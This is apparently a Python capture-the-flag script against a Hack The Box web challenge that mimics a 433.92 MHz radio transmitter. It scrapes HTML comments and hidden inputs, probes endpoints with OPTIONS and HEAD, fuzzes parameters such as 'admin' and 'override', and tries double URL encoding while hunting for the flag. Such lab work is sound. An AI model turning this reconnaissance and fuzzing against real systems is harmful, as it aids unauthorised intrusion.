#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 60: Revisar el código fuente HTML completo buscando comentarios ocultos
print("[*] INNOVACIÓN 60: Buscar comentarios HTML")
s = requests.Session()
r = s.get(base_url)

comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
if comments:
    print(f"[+] Found {len(comments)} HTML comments")
    for i, comment in enumerate(comments):
        print(f"  Comment {i}: {comment[:100]}")
        if 'HTB' in comment or 'flag' in comment.lower():
            print(f"  [!] INTERESTING: {comment}")

# Buscar hidden inputs
hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', r.text)
if hidden:
    print(f"[+] Found {len(hidden)} hidden inputs")
    for h in hidden:
        print(f"  {h}")

# INNOVACIÓN 61: Probar método OPTIONS HTTP
print("\n[*] INNOVACIÓN 61: OPTIONS request")
r = s.options(base_url)
print(f"OPTIONS status: {r.status_code}")
print(f"Allow header: {r.headers.get('Allow', 'N/A')}")
print(f"Response: {r.text[:200]}")

r = s.options(f'{base_url}/transmit')
print(f"OPTIONS /transmit status: {r.status_code}")
print(f"Allow header: {r.headers.get('Allow', 'N/A')}")

# INNOVACIÓN 62: Probar con método HEAD
print("\n[*] INNOVACIÓN 62: HEAD requests")
for endpoint in ['/', '/transmit', '/updates', '/capture', '/flag']:
    try:
        r = s.head(f'{base_url}{endpoint}')
        print(f"HEAD {endpoint}: {r.status_code}")
        for key, value in r.headers.items():
            if 'flag' in value.lower() or 'htb' in value.lower():
                print(f"  [!] {key}: {value}")
    except:
        pass

# INNOVACIÓN 63: Fuzzing de parámetros adicionales
print("\n[*] INNOVACIÓN 63: Parámetros adicionales en transmit")
s = requests.Session()
s.get(base_url)

extra_params = [
    {'device': 'E1', 'action': 'off'},
    {'target': 'all', 'command': 'disable'},
    {'mode': 'emergency'},
    {'override': 'true'},
    {'admin': '1'},
    {'debug': '1'},
    {'test': '1'},
]

for params in extra_params:
    params.update({'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': 'E1FF217D'})
    r = s.post(f'{base_url}/transmit', data=params)
    if 'HTB{' in r.text or 'success' in r.text.lower():
        print(f"[+] Interesting with params: {params}")
        print(r.text[:200])

# INNOVACIÓN 64: Probar URL encoding doble
print("\n[*] INNOVACIÓN 64: URL encoding")
import urllib.parse

msg = 'E1FF217D'
encoded_once = urllib.parse.quote(msg)
encoded_twice = urllib.parse.quote(encoded_once)

for encoded_msg in [encoded_once, encoded_twice]:
    r = s.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': encoded_msg
    })
    if 'HTB{' in r.text:
        print(f"[SUCCESS with encoding]")
        print(re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 60-64 completadas")
